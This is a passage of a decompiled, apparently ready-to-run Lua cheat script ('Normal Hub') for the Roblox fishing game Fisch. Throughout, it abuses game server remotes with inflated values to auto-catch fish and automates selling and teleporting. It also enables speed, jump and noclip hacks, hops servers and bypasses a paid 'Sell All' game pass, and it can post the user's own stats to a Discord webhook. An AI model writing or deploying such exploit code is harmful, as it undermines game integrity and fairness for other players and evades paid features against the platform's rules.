				L_100_.Text = "<font color='#ff4949'>Lure </font>: " .. tostring(ExportValue(tostring(LocalPlayer.Character:FindFirstChild(L_99_).values.lure.Value), 2)) .. "%"
				RunService.Heartbeat:Wait()
			until not LocalPlayer.Character:FindFirstChild(L_99_) or LocalPlayer.Character:FindFirstChild(L_99_).values.bite.Value or not Config['Farm Fish']
			L_100_.Text = "<font color='#ff4949'>FISHING!</font>"
			delay(1.5, function()
				L_100_:Destroy()
			end)
			repeat
				ReplicatedStorage.events.reelfinished:FireServer(1000000000000000000000000, true)
				task.wait(.5)
			until not LocalPlayer.Character:FindFirstChild(L_99_) or not LocalPlayer.Character:FindFirstChild(L_99_).values.bite.Value or not Config['Farm Fish']
		else
			LocalPlayer.Character:FindFirstChild(L_99_).events.cast:FireServer(1000000000000000000000000)
			task.wait(2)
		end
	end
end;
AllFuncs['Sell Fish'] = function()
	while Config['Sell Fish'] and task.wait(3) do
		game:GetService("ReplicatedStorage"):WaitForChild("events"):WaitForChild("selleverything"):InvokeServer()
	end
end;
AllFuncs['To Pos Stand'] = function()
	while Config['To Pos Stand'] and task.wait() do
		if not Config['SelectPositionStand'] then
			Notify("Pls Select Position")
			Config['To Pos Stand'] = false;
			return
		end;
		pcall(function()
			LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = Config['SelectPositionStand']
		end)
	end
end;
AllFuncs['Toggle Walk Speed'] = function()
	while Config['Toggle Walk Speed'] and task.wait() do
		pcall(function()
			LocalPlayer.Character:FindFirstChild("Humanoid").WalkSpeed = Config['Set Walk Speed']
		end)
	end;
	if not Config['Toggle Walk Speed'] then
		pcall(function()
			LocalPlayer.Character:FindFirstChild("Humanoid").WalkSpeed = 16
		end)
	end
end;
AllFuncs['Toggle Jump Power'] = function()
	while Config['Toggle Jump Power'] and task.wait() do
		pcall(function()
			LocalPlayer.Character:FindFirstChild("Humanoid").JumpPower = Config['Set Jump Power']
		end)
	end;
	if not Config['Toggle Jump Power'] then
		pcall(function()
			LocalPlayer.Character:FindFirstChild("Humanoid").JumpPower = 50
		end)
	end
end;
AllFuncs['Toggle Noclip'] = function()
	while Config['Toggle Noclip'] and task.wait() do
		local L_101_ = LocalPlayer.Character:GetDescendants()
		for L_102_forvar0, L_103_forvar1 in pairs(L_101_) do
			if L_103_forvar1:IsA("BasePart") and LocalPlayer.Character then
				if L_103_forvar1.CanCollide then
					L_103_forvar1.CanCollide = false
				end
			end
		end
	end;
	if not Config['Toggle Noclip'] then
		local L_104_ = LocalPlayer.Character:GetDescendants()
		for L_105_forvar0, L_106_forvar1 in pairs(L_104_) do
			if L_106_forvar1:IsA("BasePart") and LocalPlayer.Character then
				L_106_forvar1.CanCollide = true
			end
		end
	end
end;
GetPlayerProfile = function()
	local L_107_ = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" .. LocalPlayer.UserId .. "&size=420x420&format=Png&isCircular=false")
	return HttpService:JSONDecode(L_107_)['data'][1]['imageUrl']
end;
comma_value = function(L_108_arg0)
	local L_109_ = L_108_arg0;
	while true do
		local L_110_, L_111_ = string.gsub(L_109_, "^(-?%d+)(%d%d%d)", "%1,%2")
		L_109_ = L_110_;
		if L_111_ == 0 then
			break
		end
	end;
	return L_109_
end;
function GetPosition()
	if not game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
		return {
			Vector3.new(0, 0, 0),
			Vector3.new(0, 0, 0),
			Vector3.new(0, 0, 0)
		}
	end;
	return {
		game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position.X,
		game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position.Y,
		game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position.Z
	}
end;
function ExportValue(L_112_arg0, L_113_arg1)
	return tonumber(string.format("%." .. (L_113_arg1 or 1) .. 'f', L_112_arg0))
end;
AllFuncs.HopServer = function(L_114_arg0)
	local L_115_ = L_114_arg0 or false;
	local L_116_ = game:GetService("HttpService")
	local L_117_ = "https://games.roblox.com/v1/games/"
	local L_118_ = game.PlaceId;
	local L_119_ = L_117_ .. L_118_ .. "/servers/Public?sortOrder=Asc&limit=100"
	local L_120_ = function(L_123_arg0)
		local L_124_ = game:HttpGet(L_119_ .. ((L_123_arg0 and "&cursor=" .. L_123_arg0) or ""))
		return L_116_:JSONDecode(L_124_)
	end;
	local L_121_, L_122_;
	repeat
		local L_125_ = L_120_(L_122_)
		L_121_ = L_125_.data[1]
		L_122_ = L_125_.nextPageCursor
	until L_121_;
	repeat
		if not L_115_ then
			game:GetService("TeleportService"):TeleportToPlaceInstance(L_118_, L_121_.id, game.Players.LocalPlayer)
		else
			if request then
				local L_126_ = {}
				local L_127_ = request({
					Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", game.PlaceId)
				}).Body;
				local L_128_ = game:GetService("HttpService"):JSONDecode(L_127_)
				if L_128_ and L_128_.data then
					for L_129_forvar0, L_130_forvar1 in next, L_128_.data do
						if type(L_130_forvar1) == "table" and tonumber(L_130_forvar1.playing) and tonumber(L_130_forvar1.maxPlayers) and L_130_forvar1.playing < L_130_forvar1.maxPlayers and L_130_forvar1.id ~= game.JobId then
							table.insert(L_126_, 1, L_130_forvar1.id)
						end
					end
				end;
				if # L_126_ > 0 then
					game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, L_126_[math.random(1, # L_126_)], game.Players.LocalPlayer)
				else
					return "Couldn't find a server."
				end
			end
		end;
		wait()
	until game.PlaceId ~= game.PlaceId
end;
local L_9_ = tick()
AllFuncs['Sending Webhook'] = function()
	while Config['Sending Webhook'] and task.wait() do
		if tick() - L_9_ >= tonumber(Config['Delay Sending']) and (Config['Current Level'] or Config['Current Money']) then
			L_9_ = tick()
			local L_131_ = ""
			local L_132_ = ""
			local L_133_ = ""
			local L_134_ = "**"
			if Config['Current Level'] then
				L_131_ = "\nNow Level : " .. comma_value(LocalPlayer.leaderstats.Level.Value)
			end;
			if Config['Current Money'] then
				L_132_ = "\nNow Money : " .. tostring(LocalPlayer.PlayerGui.hud.safezone.coins.Text)
			end;
			if Config['All Fish Inventory'] then
				L_133_ = "```"
				for L_136_forvar0, L_137_forvar1 in pairs(GetFishInInventory()) do
					L_133_ = L_133_ .. L_136_forvar0;
					if Config['Send Kilo Fish'] then
						L_133_ = L_133_ .. " : " .. L_137_forvar1[1]
					end;
					if Config['Send Price Fish'] then
						L_133_ = L_133_ .. " : " .. L_137_forvar1[2]
					end;
					L_133_ = L_133_ .. "\n"
				end;
				L_133_ = L_133_ .. "```"
			end;
			local L_135_ = sendwebhook(Config['WebHook Configs'], {
				["content"] = ((Config['Ping Discord Id'] and Config['"Discord Id'] ~= "") and "<@" .. Config['"Discord Id'] .. ">"),
				["embeds"] = {
					{
						["id"] = 661605297,
						["title"] = "Fisch Notify",
						["description"] = "** Player : " .. LocalPlayer.Name .. "\n " .. L_132_ .. "" .. L_131_ .. "" .. L_133_ .. "**",
						["color"] = 8646911,
						["fields"] = {},
						["thumbnail"] = {
							["url"] = GetPlayerProfile()
						},
						["footer"] = {
							["text"] = "Normal Hub Notify",
							["icon_url"] = "https://cdn.discordapp.com/attachments/971367335405449246/1259442279672844308/Profile_1.png?ex=66fbc206&is=66fa7086&hm=0b8898eb98938e100ad3cede12d0a526d344cd3ba7d4f737f728ca188a1af027&"
						}
					}
				}
			})
			if L_135_ then
				Notify("Sending WebHook Success")
			else
				Notify("Failed Sending WebHook!")
			end
		end
	end
end;
workspace.active.ChildAdded:Connect(function(L_138_arg0)
	if Config['Safe Whirlpool Spawn'] and Config['WebHook Configs'] ~= "" then
		if L_138_arg0.Name == "Safe Whirlpool" then
			local L_139_ = {
				L_138_arg0.Position.X,
				L_138_arg0.Position.Y,
				L_138_arg0.Position.Z
			}
			local L_140_ = string.format("%s, %s, %s", ExportValue(L_139_[1]), ExportValue(L_139_[2]), ExportValue(L_139_[3]))
			local L_141_ = sendwebhook(Config['WebHook Configs'], {
				["content"] = ((Config['Ping Discord Id'] and Config['"Discord Id'] ~= "") and "<@" .. Config['"Discord Id'] .. ">"),
				["embeds"] = {
					{
						["id"] = 661605297,
						["title"] = "Fisch Notify",
						["description"] = "** Player : " .. LocalPlayer.Name .. "\n Found Safe Whirlpool\n Position : " .. L_140_ .. "**",
						["color"] = 8646911,
						["fields"] = {},
						["thumbnail"] = {
							["url"] = GetPlayerProfile()
						},
						["footer"] = {
							["text"] = "Normal Hub Notify",
							["icon_url"] = "https://cdn.discordapp.com/attachments/971367335405449246/1259442279672844308/Profile_1.png?ex=66fbc206&is=66fa7086&hm=0b8898eb98938e100ad3cede12d0a526d344cd3ba7d4f737f728ca188a1af027&"
						}
					}
				}
			})
			if L_141_ then
				Notify("Sending WebHook Success")
			else
				Notify("Failed Sending WebHook!")
			end
		end
	end
end)
Main = L_8_.General:AddSection('General')
do
	SelectPosition = Main:AddParagraph({
		Title = "Position : N/A"
	})
	Toggle(Main, "Auto Farm Fish", "", "Farm Fish")
	Toggle(Main, "Teleport To Select Position", "", "To Pos Stand")
	Main:AddButton({
		Title = "Select Position",
		Callback = function()
			Config['SelectPositionStand'] = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame;
			SelectPosition:SetTitle("Position : " .. tostring(math.floor(LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position.X)) .. " X " .. tostring(math.floor(LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position.Y)) .. " Y " .. tostring(math.floor(LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position.Z)) .. " Z")
		end
	})
end;
IngredientList = {}
for L_142_forvar0, L_143_forvar1 in pairs(workspace.active:GetDescendants()) do
	if L_143_forvar1.ClassName == "TextLabel" and L_143_forvar1.Text == "Ingredient" then
		local L_144_ = nil;
		GetRealPart = function(L_146_arg0)
			if L_146_arg0.ClassName == "Model" then
				L_144_ = L_146_arg0
			else
				GetRealPart(L_146_arg0.Parent)
			end
		end;
		GetRealPart(L_143_forvar1)
		local L_145_ = L_144_.Name;
		if L_144_:FindFirstChildOfClass("MeshPart") then
			if L_144_:FindFirstChildOfClass("MeshPart").Position.X > 500 then
				continue
			end
		end;
		if L_144_:FindFirstChild("PickupPrompt") then
			L_144_:FindFirstChild("PickupPrompt").HoldDuration = 0
		end;
		table.insert(IngredientList, L_145_)
	end
end;
_hasItem = function(L_147_arg0)
	if Backpack:FindFirstChild(L_147_arg0) then
		return true
	end;
	if LocalPlayer.Character:FindFirstChild(L_147_arg0) then
		return true
	end
end;
Threads[# Threads + 1] = task.spawn(function()
	while wait(.75) do
		table.clear(IngredientList)
		for L_148_forvar0, L_149_forvar1 in pairs(workspace.active:GetDescendants()) do
			if L_149_forvar1.ClassName == "TextLabel" and L_149_forvar1.Text == "Ingredient" then
				local L_150_ = nil;
				GetRealPart = function(L_152_arg0)
					if L_152_arg0.ClassName == "Model" then
						L_150_ = L_152_arg0
					else
						GetRealPart(L_152_arg0.Parent)
					end
				end;
				GetRealPart(L_149_forvar1)
				local L_151_ = L_150_.Name;
				if L_150_:FindFirstChildOfClass("MeshPart") then
					if L_150_:FindFirstChildOfClass("MeshPart").Position.X > 500 then
						continue
					end
				end;
				if L_150_:FindFirstChild("PickupPrompt") then
					L_150_:FindFirstChild("PickupPrompt").HoldDuration = 0
				end;
				table.insert(IngredientList, L_151_)
			end
		end
	end
end)
AllFuncs['Auto Find Boat Event'] = function()
	while Config['Auto Find Boat Event'] and task.wait(.75) do
		if (# IngredientList <= 0 and not _hasItem("Witches Ingredient")) then
			if Config['Hop Not Found Ingredient'] then
				AllFuncs.HopServer(true)
			end;
			continue
		end;
		local L_153_ = ReplicatedStorage.playerstats[LocalPlayer.Name].Stats.rod.Value;
		if LocalPlayer.Character:FindFirstChild(L_153_) and LocalPlayer.Character:FindFirstChild(L_153_).values.bite.Value then
			continue
		end;
		if Config["Farm Fish"] then
			Config["Farm Fish"] = false;
			continue
		end;
		if Config['To Pos Stand'] then
			Config['To Pos Stand'] = false;
			continue
		end;
		for L_154_forvar0, L_155_forvar1 in pairs(IngredientList) do
			for L_156_forvar0, L_157_forvar1 in pairs(workspace.active:GetChildren()) do
				if L_157_forvar1.Name == L_155_forvar1 then
					if L_157_forvar1:FindFirstChildOfClass("MeshPart") then
						if L_157_forvar1:FindFirstChildOfClass("MeshPart").Position.X > 200 then
							continue
						end
					end;
					LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = L_157_forvar1:GetPivot()
					wait(1)
					VirtualInputManager:SendKeyEvent(true, "E", false, game)
					VirtualInputManager:SendKeyEvent(false, "E", false, game)
					fireproximityprompt(L_157_forvar1.PickupPrompt, 1)
				end
			end
		end;
		if _hasItem("Witches Ingredient") then
			repeat
				task.wait()
				LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(404.7090148925781, 134.5, 317.6537780761719)
				if Backpack:FindFirstChild("Witches Ingredient") then
					LocalPlayer.Character.Humanoid:EquipTool(Backpack:FindFirstChild("Witches Ingredient"))
				end;
				fireproximityprompt(workspace.world.map.halloween.witch.WitchesPot.AcidTop.Prompt, 1)
			until not _hasItem("Witches Ingredient") or not Config["Auto Find Boat Event"]
			if Config['Halloween Success'] and Config['WebHook Configs'] ~= "" then
				local L_158_ = sendwebhook(Config['WebHook Configs'], {
					["content"] = ((Config['Ping Discord Id'] and Config['"Discord Id'] ~= "") and "<@" .. Config['"Discord Id'] .. ">"),
					["embeds"] = {
						{
							["id"] = 661605297,
							["title"] = "Fisch Notify",
							["description"] = "** Player : " .. LocalPlayer.Name .. "\n Trade Witches Ingredient Success **",
							["color"] = 8646911,
							["fields"] = {},
							["thumbnail"] = {
								["url"] = GetPlayerProfile()
							},
							["footer"] = {
								["text"] = "Normal Hub Notify",
								["icon_url"] = "https://cdn.discordapp.com/attachments/971367335405449246/1259442279672844308/Profile_1.png?ex=66fbc206&is=66fa7086&hm=0b8898eb98938e100ad3cede12d0a526d344cd3ba7d4f737f728ca188a1af027&"
							}
						}
					}
				})
				if L_158_ then
					Notify("Sending WebHook Success")
				else
					Notify("Failed Sending WebHook!")
				end
			end
		end;
		if Config['Back To Fishing'] and not _hasItem("Witches Ingredient") and # IngredientList <= 0 then
			Config["Farm Fish"] = true;
			Config['To Pos Stand'] = true;
			task.spawn(AllFuncs['Farm Fish'])
			task.spawn(AllFuncs['To Pos Stand'])
		end
	end
end;
Event = L_8_.Event:AddSection('Event')
do
	IngredientDropdwon = Dropdown(Event, "Select Ingredient", "", IngredientList, false, "Ingredient Select")
	Toggle(Event, "Auto Halloween Event ", "", "Auto Find Boat Event")
	Toggle(Event, "Back To Auto Fishing", "", "Back To Fishing")
	Toggle(Event, "Hop Server", "Hop Server For Not Found Ingredient", "Hop Not Found Ingredient")
	Event:AddButton({
		Title = "Teleport To Ingredient",
		Callback = function()
			if Config['Ingredient Select'] == "" then
				Notify("Pls Select Ingredient ")
				return
			end;
			for L_159_forvar0, L_160_forvar1 in pairs(workspace.active:GetChildren()) do
				if L_160_forvar1.Name == Config['Ingredient Select'] then
					if L_160_forvar1:FindFirstChildOfClass("MeshPart") then
						if L_160_forvar1:FindFirstChildOfClass("MeshPart").Position.X > 200 then
							continue
						end
					end;
					LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = L_160_forvar1:GetPivot()
				end
			end;
			Notify("Not Found `" .. Config["Ingredient Select"] .. "` ")
		end
	})
	Event:AddButton({
		Title = "Refresh Ingredient",
		Callback = function()
			IngredientDropdwon:SetValues(IngredientList)
		end
	})
end;
Seller = L_8_.General:AddSection('Seller')
do
	Toggle(Seller, "Auto Sell Fish", "", "Sell Fish")
	Seller:AddButton({
		Title = "Sell All Fish",
		Callback = function()
			ReplicatedStorage:WaitForChild("events"):WaitForChild("selleverything"):InvokeServer()
		end
	})
	Seller:AddButton({
		Title = "Sell Fish ( In Hand )",
		Callback = function()
			workspace.world.npcs:FindFirstChild("Marc Merchant").merchant.sell:InvokeServer()
		end
	})
	Seller:AddButton({
		Title = "Show Ui Buy Boat",
		Callback = function()
			PlayerGui.hud.safezone.shipwright.Visible = not PlayerGui.hud.safezone.shipwright.Visible
		end
	})
end;
FishList = {}
for L_161_forvar0, L_162_forvar1 in pairs(FISHDATA) do
	table.insert(FishList, L_161_forvar0)
end;
InfoFish = L_8_.General:AddSection('Info Fish')
do
	InfoPrice = InfoFish:AddParagraph({
		Title = "Pice : N/A"
	})
	InfoRarity = InfoFish:AddParagraph({
		Title = "Rarity : N/A"
	})
	InfoChance = InfoFish:AddParagraph({
		Title = "Chance : N/A"
	})
	InfoFavouriteBait = InfoFish:AddParagraph({
		Title = "FavouriteBait : N/A"
	})
	Dropdown(InfoFish, "Select Fish", "", FishList, false, "Select Fish Info")
	InfoFish:AddButton({
		Title = "Get Info Fish In Hand",
		Callback = function()
			for L_163_forvar0, L_164_forvar1 in pairs(LocalPlayer.Character:GetChildren()) do
				if table.find(FishList, L_164_forvar1.Name) then
					Config['Select Fish Info'] = L_164_forvar1.Name;
					InfoPrice:SetTitle("Price : " .. FISHDATA[Config['Select Fish Info']].Price)
					InfoRarity:SetTitle("Rarity : " .. FISHDATA[Config['Select Fish Info']].Rarity)
					InfoChance:SetTitle("Chance : " .. FISHDATA[Config['Select Fish Info']].Chance .. " %")
					InfoFavouriteBait:SetTitle("FavouriteBait : " .. FISHDATA[Config['Select Fish Info']].FavouriteBait)
					return
				end
			end;
			Notify("Pls Equip Fish")
		end
	})
	InfoFish:AddButton({
		Title = "Get Info Fish",
		Callback = function()
			if Config['Select Fish Info'] == "" then
				Notify("Pls Select Fish")
				return
			end;
			InfoPrice:SetTitle("Price : " .. FISHDATA[Config['Select Fish Info']].Price)
			InfoRarity:SetTitle("Rarity : " .. FISHDATA[Config['Select Fish Info']].Rarity)
			InfoChance:SetTitle("Chance : " .. FISHDATA[Config['Select Fish Info']].Chance .. " %")
			InfoFavouriteBait:SetTitle("FavouriteBait : " .. FISHDATA[Config['Select Fish Info']].FavouriteBait)
		end
	})
end;
Modify = L_8_.Player:AddSection('Player Modify')
do
	Slider(Modify, "Walk Speed", 10, 300, false, "Set Walk Speed")
	Slider(Modify, "Jump Power", 25, 300, false, "Set Jump Power")
	Toggle(Modify, "Walk Speed", "", "Toggle Walk Speed")
	Toggle(Modify, "Jump Power", "", "Toggle Jump Power")
end;
MiscPlayer = L_8_.Player:AddSection('Misc Player')
do
	DayOnlyLoop = nil;
	BypassGpsLoop = nil;
	Toggle(MiscPlayer, "Bypass Radar", "", "Bypass Radar", function(L_165_arg0)
		for L_166_forvar0, L_167_forvar1 in pairs(game:GetService("CollectionService"):GetTagged("radarTag")) do
			if L_167_forvar1:IsA("BillboardGui") or L_167_forvar1:IsA("SurfaceGui") then
				L_167_forvar1.Enabled = L_165_arg0
			end
		end
	end)
	Toggle(MiscPlayer, "Bypass Gps", "", "Bypass Gps", function(L_168_arg0)
		if L_168_arg0 then
			local L_169_ = game:GetService("ReplicatedStorage").resources.items.items.GPS.GPS.gpsMain.xyz:Clone()
			L_169_.Parent = game.Players.LocalPlayer.PlayerGui:WaitForChild("hud"):WaitForChild("safezone"):WaitForChild("backpack")
			local L_170_ = GetPosition()
			local L_171_ = string.format("%s,%s,%s", ExportValue(L_170_[1]), ExportValue(L_170_[2]), ExportValue(L_170_[3]))
			L_169_.Text = "<font color='#ff4949'>X</font><font color = '#a3ff81'>Y</font><font color = '#626aff'>Z</font>: " .. L_171_;
			BypassGpsLoop = game:GetService("RunService").Heartbeat:Connect(function()
				local L_172_ = GetPosition()
				L_171_ = string.format("%s,%s,%s", ExportValue(L_172_[1]), ExportValue(L_172_[2]), ExportValue(L_172_[3]))
				L_169_.Text = "<font color='#ff4949'>X</font><font color = '#a3ff81'>Y</font><font color = '#626aff'>Z</font>: " .. L_171_
			end)
		else
			if PlayerGui.hud.safezone.backpack:FindFirstChild("xyz") then
				PlayerGui.hud.safezone.backpack:FindFirstChild("xyz"):Destroy()
			end;
			if BypassGpsLoop then
				BypassGpsLoop:Disconnect()
				BypassGpsLoop = nil
			end
		end
	end)
	Toggle(MiscPlayer, "Bypass Sell All ( Gane Pass )", "", "Bypass Sell all", function(L_173_arg0)
		if L_173_arg0 then
			PlayerGui.hud.safezone.backpack.inventory.Sell.sellall.Disabled = true;
			PlayerGui.hud.safezone.backpack.inventory.Sell.MouseButton1Click:Connect(function()
				if PlayerGui.hud.safezone.backpack.inventory.Sell.sellall.Disabled then
					ReplicatedStorage:WaitForChild("events"):WaitForChild("selleverything"):InvokeServer()
				end
			end)
		else
			PlayerGui.hud.safezone.backpack.inventory.Sell.sellall.Disabled = false
		end
	end)
	Toggle(MiscPlayer, "Infinite Oxygen", "", "Infinite Oxygen", function(L_174_arg0)
		LocalPlayer.Character.client.oxygen.Disabled = L_174_arg0
	end)
	Toggle(MiscPlayer, "Weather Clear", "", "Weather Clear", function(L_175_arg0)
		local L_176_ = ReplicatedStorage.world.weather.Value;
		if L_175_arg0 then
			ReplicatedStorage.world.weather.Value = 'Clear'
		else
			ReplicatedStorage.world.weather.Value = L_176_
		end
	end)
	Toggle(MiscPlayer, "Noclip", "", "Toggle Noclip")
	Toggle(MiscPlayer, "Walk On Water", "", "Toggle Walk On Water", function(L_177_arg0)
		for L_178_forvar0, L_179_forvar1 in pairs(workspace.zones.fishing:GetChildren()) do
			if L_179_forvar1.Name == "Ocean" then
				L_179_forvar1.CanCollide = L_177_arg0
			end
		end
	end)
	Toggle(MiscPlayer, "Remove Fog", "", "Remove Fog", function(L_180_arg0)
		if L_180_arg0 then
			if game:GetService("Lighting"):FindFirstChild("Sky") then
				game:GetService("Lighting"):FindFirstChild("Sky").Parent = game:GetService("Lighting").bloom
			end
		else
			if game:GetService("Lighting").bloom:FindFirstChild("Sky") then
				game:GetService("Lighting").bloom:FindFirstChild("Sky").Parent = game:GetService("Lighting")
			end
		end
	end)
	Toggle(MiscPlayer, "Day Only", "", "Day Only", function(L_181_arg0)
		if L_181_arg0 then
			DayOnlyLoop = RunService.Heartbeat:Connect(function()
				game:GetService("Lighting").TimeOfDay = "12:00:00"
			end)
		else
			if DayOnlyLoop then
				DayOnlyLoop:Disconnect()
				DayOnlyLoop = nil
			end
		end
	end)
	Toggle(MiscPlayer, "Night Only", "", "Night Only", function(L_182_arg0)
		if L_182_arg0 then
			DayOnlyLoop = RunService.Heartbeat:Connect(function()
				game:GetService("Lighting").TimeOfDay = "22:00:00"
			end)
		else
			if DayOnlyLoop then
				DayOnlyLoop:Disconnect()
				DayOnlyLoop = nil
			end
		end
	end)
	MiscPlayer:AddButton({
		Title = "Rejoin Server",
		Description = "",
		Callback = function()
			TeleportService:TeleportToPlaceInstance(game.placeId, game.jobId, game.Players.LocalPlayer)
		end
	})
	MiscPlayer:AddButton({
		Title = "Hop Server",
		Description = "",
		Callback = function()
			AllFuncs.HopServer(true)
		end
	})
	MiscPlayer:AddButton({
		Title = "Hop Server Low",
		Description = "",
		Callback = function()
			AllFuncs.HopServer(false)
		end
	})
	MiscPlayer:AddButton({
		Title = "Anti Lag ( Once )",
		Description = "",
		Callback = function()
			for L_183_forvar0, L_184_forvar1 in pairs(game:GetDescendants()) do
				if L_184_forvar1:IsA("Part") or L_184_forvar1:IsA("UnionOperation") or L_184_forvar1:IsA("MeshPart") then
					if L_184_forvar1.Transparency ~= 1 then
						L_184_forvar1.Material = Enum.Material.SmoothPlastic
					end
				elseif L_184_forvar1:IsA("ParticleEmitter") or L_184_forvar1:IsA("Trail") then
					L_184_forvar1:Destroy()
				end
			end;
			Notify("Anti Lag Success")
		end
	})
	MiscPlayer:AddButton({
		Title = "Destroy All Particle",
		Description = "",
		Callback = function()
			for L_185_forvar0, L_186_forvar1 in pairs(game:GetDescendants()) do
				if L_186_forvar1:IsA("ParticleEmitter") or L_186_forvar1:IsA("Trail") then
					L_186_forvar1:Destroy()
				end
			end;
			Notify("Success Destroy Particle")
		end
	})
end;
Shoppy = L_8_.Shop:AddSection('Shop All')
do
	Toggle(Shoppy, "Teleport To Buy", "", "Teleport To Buy")
	for L_187_forvar0, L_188_forvar1 in pairs(workspace.world.interactables:GetDescendants()) do
		if L_188_forvar1.Name == "purchaserompt" or L_188_forvar1.ClassName == "ProximityPrompt" then
			L_188_forvar1.HoldDuration = 0;
			Shoppy:AddButton({
				Title = "Buy " .. L_188_forvar1.Parent.Name,
				Description = L_188_forvar1.ActionText,
				Callback = function()
					if fireproximityprompt and not Config['Teleport To Buy'] then
						local L_189_ = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame;
						LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = L_188_forvar1.Parent:GetPivot()
						delay(.3, function()
							fireproximityprompt(L_188_forvar1, 1)
							LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = L_189_
						end)
					else
						if not fireproximityprompt then
							Notify("Execute Not Support fireproximityprompt")
						end;
						LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = L_188_forvar1.Parent:GetPivot()
					end
				end
			})
		end
	end
end;
Shoppy:AddButton({
	Title = "Buy Enchant Relic",
	Description = "View [11,000C$]",
	Callback = function()
		local L_190_ = game.Players.LocalPlayer;
		local L_191_ = L_190_.Character or L_190_.CharacterAdded:Wait()
		local L_192_ = L_191_.HumanoidRootPart.Position;
		local L_193_ = Vector3.new(- 931.5254516601562, 223.78355407714844, - 986.8485717773438)
		L_191_:SetPrimaryPartCFrame(CFrame.new(L_193_))
		local L_194_ = workspace:WaitForChild("world"):WaitForChild("npcs"):WaitForChild("Merlin"):WaitForChild("Merlin"):WaitForChild("power")
		L_194_:InvokeServer()
		wait(0)
		L_191_:SetPrimaryPartCFrame(CFrame.new(L_192_))
	end
})
WebHookConfigs = L_8_.Configs:AddSection('WebHook')
do
	TextBox(WebHookConfigs, "WebHook", "", "discord.com/api/webhooks", false, "WebHook Configs")
	TextBox(WebHookConfigs, "Discord Id", "", "1010021431075155979", false, "Discord Id Ping")
	Slider(WebHookConfigs, "Delay Sending (Sec)", 10, 600, false, "Delay Sending")
	Toggle(WebHookConfigs, "Sending WebHook", "", "Sending Webhook")
	Toggle(WebHookConfigs, "Ping Discord Id", "", "Ping Discord Id")
	WebHookConfigs:AddButton({
		Title = "Test WebHook",
		Description = "",
		Callback = function()
			local L_195_ = sendwebhook(Config['WebHook Configs'], {
				["content"] = ((Config['Ping Discord Id'] and tostring(Config['"Discord Id']) ~= "") and "<@" .. tostring(Config['"Discord Id']) .. ">"),
				["embeds"] = {
					{
						["id"] = 661605297,
						["title"] = "Fisch Notify",
						["description"] = "** Player : " .. LocalPlayer.Name .. "\n THIS TESTING WEBHOOK**",
						["color"] = 8646911,
						["fields"] = {},
						["thumbnail"] = {
							["url"] = GetPlayerProfile()
						},
						["footer"] = {
							["text"] = "Normal Hub Notify",
							["icon_url"] = "https://cdn.discordapp.com/attachments/971367335405449246/1259442279672844308/Profile_1.png?ex=66fbc206&is=66fa7086&hm=0b8898eb98938e100ad3cede12d0a526d344cd3ba7d4f737f728ca188a1af027&"
						}
					}
				}
			})
			if L_195_ then
				Notify("Sending WebHook Success", 1)
			else
				Notify("Failed Sending WebHook!", 1)
			end
		end
	})
end;
local L_10_ = {}
GetCount = function(L_196_arg0)
	local L_197_ = 0;
	for L_198_forvar0, L_199_forvar1 in pairs(PlayerGui.hud.safezone.backpack.hotbar:GetChildren()) do
		if L_199_forvar1:FindFirstChild("tool") and tostring(L_199_forvar1.tool.value) == L_196_arg0 then
			L_197_ += 1
		end
	end;
	for L_200_forvar0, L_201_forvar1 in pairs(PlayerGui.hud.safezone.backpack.inventory.scroll.safezone:GetChildren()) do
		if L_201_forvar1.Name == L_196_arg0 then
			L_197_ += 1
		end
	end;
	return L_197_
end;
function GetFishInInventory()
	local L_202_ = {}
	for L_203_forvar0, L_204_forvar1 in pairs(PlayerGui.hud.safezone.backpack.hotbar:GetChildren()) do
		if L_204_forvar1:FindFirstChild("tool") and table.find(FishList, tostring(L_204_forvar1.tool.value)) then
			local L_205_ = L_204_forvar1.stack.Text:match("%d+") or "1"
			L_202_[tostring(L_204_forvar1.itemname.Text:gsub("<.->", "")) .. " X" .. L_205_] = {
				L_204_forvar1.weight.Text,
				((FISHDATA[tostring(L_204_forvar1.tool.value)] and FISHDATA[tostring(L_204_forvar1.tool.value)].Price) or "0") .. "$"
			}
		end
	end;
	for L_206_forvar0, L_207_forvar1 in pairs(PlayerGui.hud.safezone.backpack.inventory.scroll.safezone:GetChildren()) do
		if table.find(FishList, L_207_forvar1.Name) then
			local L_208_ = L_207_forvar1.stack.Text:match("%d+") or "1"
			L_202_[tostring(L_207_forvar1.itemname.Text:gsub("<.->", "")) .. " X" .. L_208_] = {
				L_207_forvar1.weight.Text,
				((FISHDATA[L_207_forvar1.Name] and FISHDATA[L_207_forvar1.Name].Price) or "0") .. "$"
			}
		end
	end;
	return L_202_
end;
WebHookConfigsData = L_8_.Configs:AddSection('Data Sending')
do
	Toggle(WebHookConfigsData, "Current Money", "", "Current Money")
	Toggle(WebHookConfigsData, "Current Level", "", "Current Level")
	Toggle(WebHookConfigsData, "All Fish Inventory", "", "All Fish Inventory")
	Toggle(WebHookConfigsData, "Send Kilo Fish", "", "Send Kilo Fish")
	Toggle(WebHookConfigsData, "Send Price Fish", "", "Send Price Fish")
	Toggle(WebHookConfigsData, "Safe Whirlpool Spawn", "", "Safe Whirlpool Spawn")
	Toggle(WebHookConfigsData, "Halloween Success", "", "Halloween Success")
end;
Teleporting = L_8_.Teleport:AddSection('Teleport')
do
	Teleporting:AddButton({
		Title = "Sunstone Island",
		Callback = function()
